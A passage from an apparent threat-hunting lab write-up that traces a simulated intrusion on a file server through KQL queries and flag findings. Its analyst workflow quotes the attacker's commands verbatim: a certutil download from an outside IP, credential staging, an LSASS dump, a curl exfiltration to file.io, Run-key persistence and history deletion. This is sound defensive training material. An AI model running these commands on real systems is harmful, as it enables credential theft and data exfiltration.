DeviceRegistryEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where RegistryValueName contains 'FileShareSync'
| project TimeGenerated, RegistryValueName, RegistryValueData
| order by TimeGenerated asc
```

**Output:** `svchost.ps1`  
**Finding:** The persistence beacon `svchost.ps1` is named to mimic the legitimate Windows service host process. This masquerading technique makes the malicious script appear as a system file during casual inspection.
<img width="1152" height="130" alt="Pasted Graphic 18" src="https://github.com/user-attachments/assets/2acfa1da-0ba9-44ff-81f0-0dee7b9a6315" />

---

### 🚩 Flag 20: DEFENSE EVASION - History File Deletion

**Objective:** Identify the PowerShell history file deleted by the attacker.

**What to Hunt:** Attackers clear command history to remove evidence of their activities. PowerShell maintains a history file that records executed commands.

**Hint 1:** Search for file deletion events targeting PowerShell history locations.

**Hint 2:** Look for Remove-Item or del commands targeting history files in user profile paths.

**Reference:** Indicator Removal: Clear Command History

**KQL Query:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-10) .. datetime(2026-01-15))
| where DeviceName contains 'FileServer01'
| where ActionType == 'FileDeleted'
| where FileName contains 'history'
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc
```

**Output:** `ConsoleHost_history.txt`  
**Finding:** The file `ConsoleHost_history.txt` is the default PowerShell command history file. Deleting this file removes a forensic record of PowerShell commands executed by the attacker, complicating incident response.
<img width="924" height="71" alt="İntiatingfrecenCemmand is" src="https://github.com/user-attachments/assets/b0e06ebb-1dd8-4478-b74d-2c39c3b94991" />

<hr style="height: 4px; background-color: grey; border: none; margin-top: 40px;">

## 🔎 Analyst Workflow

### From an investigative standpoint, the workflow progressed as follows:

**1 🚩:** Re-entry from a different public IP indicates a return session after dwell time; the return source was **"159.26.106.98"**.  

**2 🚩:** RDP lateral movement identified the file server that received the pivot; the compromised device was **"AZUKI-FileServer01"**.  

**3 🚩:** Activity on the file server centered on a privileged file management account; the account was **"fileadmin"**.  

**4 🚩:** Local share discovery established which data repositories were exposed; the command was **"\"net.exe\" share"**.  

**5 🚩:** Remote share discovery expanded the map to other systems; the command was **"\"net.exe\" view \\\\10.1.0.188"**.  

**6 🚩:** Privilege enumeration confirmed group memberships and tokens; the command was **"whoami.exe /all"**.  

**7 🚩:** Network configuration discovery captured detailed adapter and DNS context; the command was **"ipconfig.exe /all"**.  

**8 🚩:** Staging was hidden to evade casual discovery; the command was **"attrib.exe +h +s C:\\Windows\\Logs\\CBS"**.  

**9 🚩:** The hidden staging location used for tools and data was **"C:\\Windows\\Logs\\CBS"**.  

**10 🚩:** A LOLBin was used to download tooling into staging; the command was **"certutil.exe -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\\Windows\\Logs\\CBS\\ex.ps1"**.  

**11 🚩:** Credentials were staged in a spreadsheet-friendly file; the file was **"IT-Admin-Passwords.csv"**.  

**12 🚩:** A recursive copy staged the full share with attributes preserved; the command was **"xcopy.exe C:\\FileShares\\IT-Admin C:\\Windows\\Logs\\CBS\\it-admin /E /I /H /Y"**.  

**13 🚩:** Staged data was compressed for transfer; the command was **"tar.exe -czf C:\\Windows\\Logs\\CBS\\credentials.tar.gz -C C:\\Windows\\Logs\\CBS\\it-admin ."**.  

**14 🚩:** The credential dumping tool was renamed for OPSEC; the tool was **"pd.exe"**.  

**15 🚩:** The attacker dumped LSASS to harvest credentials; the command was **"pd.exe -accepteula -ma 876 C:\\Windows\\Logs\\CBS\\lsass.dmp"**.  

**16 🚩:** The compressed archive was exfiltrated via HTTP POST; the command was **"curl.exe -F file=@C:\\Windows\\Logs\\CBS\\credentials.tar.gz https://file.io"**.  

**17 🚩:** The exfiltration endpoint was a public file-sharing service; the service was **"file.io"**.  

**18 🚩:** Persistence was established with a Run key value; the value name was **"FileShareSync"**.  

**19 🚩:** The Run key launched a masqueraded script; the beacon was **"svchost.ps1"**.  

**20 🚩:** The attacker cleared PowerShell history to reduce evidence; the file deleted was **"ConsoleHost_history.txt"**.  
